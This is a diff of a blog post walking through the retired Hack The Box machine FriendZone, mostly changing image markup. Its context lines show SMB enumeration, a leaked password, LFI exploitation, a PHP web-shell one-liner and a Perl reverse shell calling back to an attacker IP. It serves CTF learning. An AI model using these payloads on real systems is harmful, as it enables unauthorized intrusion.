@@ -17,10 +17,10 @@ This post documents the complete walkthrough of FriendZone, a retired vulnerable
 
 <!--more-->
 
-## On this post 
-{:.no_toc} 
+## On this post
+{:.no_toc}
 
-* TOC 
+* TOC
 {:toc}
 
 ## Background
@@ -142,9 +142,9 @@ Host script results:
 
 Jeez. There are so many services I don't know where to start! Let's start with SMB or Samba in this case. We can use null session to enumerate the shares like so.
 
-<a class="image-popup">
-![120d123a.png](/assets/images/posts/friendzone-htb-walkthrough/120d123a.png)
-</a>
+
+{% include image.html image_alt="120d123a.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/120d123a.png" %}
+
 
 Excellent. We have a couple of shares that we can explore.
 
@@ -159,9 +159,9 @@ Among the three shares, we can mount `general` and `Development` without any cre
 
 In `general`, there's a file `creds.txt` that looks like this.
 
-<a class="image-popup">
-![25094e7e.png](/assets/images/posts/friendzone-htb-walkthrough/25094e7e.png)
-</a>
+
+{% include image.html image_alt="25094e7e.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/25094e7e.png" %}
+
 
 Meanwhile, in `Development`, I can write files to it and it's already crowded with files. I'm pretty sure these files weren't there when the box was created. :smirk: Too bad the credential (`admin:WORKWORKHhallelujah@#`) can't mount the `Files` share. I'll just have to keep this in mind while I explore other services.
 
@@ -169,17 +169,17 @@ Meanwhile, in `Development`, I can write files to it and it's already crowded wi
 
 Let's turn our attention on the `http` service. This is how it looks like on the browser.
 
-<a class="image-popup">
-![44c8140d.png](/assets/images/posts/friendzone-htb-walkthrough/44c8140d.png)
-</a>
+
+{% include image.html image_alt="44c8140d.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/44c8140d.png" %}
+
 
 Ouch!
 
 There's our first clue. Recall the box runs a DNS service? The DNS server probably takes care of the `friendzoneportal.red` zone? Let's see if we can do a zone transfer on the box.
 
-<a class="image-popup">
-![b5cd665f.png](/assets/images/posts/friendzone-htb-walkthrough/b5cd665f.png)
-</a>
+
+{% include image.html image_alt="b5cd665f.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/b5cd665f.png" %}
+
 
 Awesome. Experience tells me I should put those subdomains into `/etc/hosts`.
 
@@ -189,9 +189,9 @@ Awesome. Experience tells me I should put those subdomains into `/etc/hosts`.
 
 But, wait. There's another zone—`friendzone.red` exposed by the `ssl/http` service, discovered in our `nmap` scan.
 
-<a class="image-popup">
-![569e34c9.png](/assets/images/posts/friendzone-htb-walkthrough/569e34c9.png)
-</a>
+
+{% include image.html image_alt="569e34c9.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/569e34c9.png" %}
+
 
 Same thing. Put these subdomains to `/etc/hosts`.
 
@@ -205,45 +205,45 @@ The domain `friendzoneportal.red` is a rabbit hole. Suffice to say, I've done my
 
 _administrator1.friendzone.htb_
 
-<a class="image-popup">
-![84984bd6.png](/assets/images/posts/friendzone-htb-walkthrough/84984bd6.png)
-</a>
+
+{% include image.html image_alt="84984bd6.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/84984bd6.png" %}
+
 
 _uploads.friendzone.htb_
 
-<a class="image-popup">
-![caeefff6.png](/assets/images/posts/friendzone-htb-walkthrough/caeefff6.png)
-</a>
+
+{% include image.html image_alt="caeefff6.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/caeefff6.png" %}
+
 
 Recall the credentials earlier? Perhaps it'll work with this admin THING? :wink:
 
-<a class="image-popup">
-![9468559f.png](/assets/images/posts/friendzone-htb-walkthrough/9468559f.png)
-</a>
+
+{% include image.html image_alt="9468559f.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/9468559f.png" %}
+
 
 It worked!
 
-<a class="image-popup">
-![9f8d715b.png](/assets/images/posts/friendzone-htb-walkthrough/9f8d715b.png)
-</a>
+
+{% include image.html image_alt="9f8d715b.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/9f8d715b.png" %}
+
 
 Let's do as told and visit `/dashboard.php`, shall we?
 
-<a class="image-popup">
-![dcc593b8.png](/assets/images/posts/friendzone-htb-walkthrough/dcc593b8.png)
-</a>
+
+{% include image.html image_alt="dcc593b8.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/dcc593b8.png" %}
+
 
 Looking at the hint on the page, I suspect a local file inclusion (LFI) vulnerability is in the cards. Let's test it out.
 
-<a class="image-popup">
-![19fbf425.png](/assets/images/posts/friendzone-htb-walkthrough/19fbf425.png)
-</a>
+
+{% include image.html image_alt="19fbf425.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/19fbf425.png" %}
+
 
 I strongly suspect a `timestamp.php` page is present.
 
-<a class="image-popup">
-![88780c18.png](/assets/images/posts/friendzone-htb-walkthrough/88780c18.png)
-</a>
+
+{% include image.html image_alt="88780c18.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/88780c18.png" %}
+
 
 Ha Ha! An inexperienced developer. Now that I know a LFI vulnerability is present, I need a way to exploit it to read files. Enter PHP Filter.
 
@@ -277,9 +277,9 @@ Recall that I was able to write to `Directory`? Let's write a small PHP file to 
 
 In the shares comment, `Files` was shown to be mapped to `/etc/Files`. By extension, `Development` should be mapped to `/etc/Development`.
 
-<a class="image-popup">
-![dfab6015.png](/assets/images/posts/friendzone-htb-walkthrough/dfab6015.png)
-</a>
+
+{% include image.html image_alt="dfab6015.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/dfab6015.png" %}
+
 
 Awesome. Now, let's step up the game and write another small PHP file, that allows us to execute remote commands.
 
@@ -289,9 +289,9 @@ Awesome. Now, let's step up the game and write another small PHP file, that allo
 # echo '<?php echo shell_exec($_GET[0]); ?>' > cmd.php
 ```
 
-<a class="image-popup">
-![5f0a0cde.png](/assets/images/posts/friendzone-htb-walkthrough/5f0a0cde.png)
-</a>
+
+{% include image.html image_alt="5f0a0cde.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/5f0a0cde.png" %}
+
 
 Sweet. Time to get ourselves a Perl reverse shell.
 
@@ -305,9 +305,9 @@ perl -e 'use Socket;$i="10.10.12.246";$p=1234;socket(S,PF_INET,SOCK_STREAM,getpr
 
 Of course, it's best to `urlencode` it to prevent complications in the browser's address bar.
 
-<a class="image-popup">
-![14648ca0.png](/assets/images/posts/friendzone-htb-walkthrough/14648ca0.png)
-</a>
+
+{% include image.html image_alt="14648ca0.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/14648ca0.png" %}
+
 
 Better [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) my shell to a full TTY.
 
@@ -315,17 +315,17 @@ Better [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-intera
 
 During enumeration of `www-data`'s account, I saw the credentials of `friend` lurking in `/var/www/mysql_data.conf`.
 
-<a class="image-popup">
-![65694d11.png](/assets/images/posts/friendzone-htb-walkthrough/65694d11.png)
-</a>
+
+{% include image.html image_alt="65694d11.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/65694d11.png" %}
+
 
 The funny thing is MySQL is not even running! Well, let's `su` ourselves as `friend`.
 
 The file `user.txt` is at `friend`'s home directory.
 
-<a class="image-popup">
-![38a7e04a.png](/assets/images/posts/friendzone-htb-walkthrough/38a7e04a.png)
-</a>
+
+{% include image.html image_alt="38a7e04a.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/38a7e04a.png" %}
+
 
 Moving on, I noticed two interesting pieces of information:
 
@@ -351,15 +351,15 @@ s.close()
 
 Two minutes later, a `root` shell appears in my `nc` listener.
 
-<a class="image-popup">
-![b9ab4cc0.png](/assets/images/posts/friendzone-htb-walkthrough/b9ab4cc0.png)
-</a>
+
+{% include image.html image_alt="b9ab4cc0.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/b9ab4cc0.png" %}
+
 
 Getting `root.txt` is trivial with a `root` shell.
 
-<a class="image-popup">
-![c0596592.png](/assets/images/posts/friendzone-htb-walkthrough/c0596592.png)
-</a>
+
+{% include image.html image_alt="c0596592.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/c0596592.png" %}
+
 
 :dancer:
 
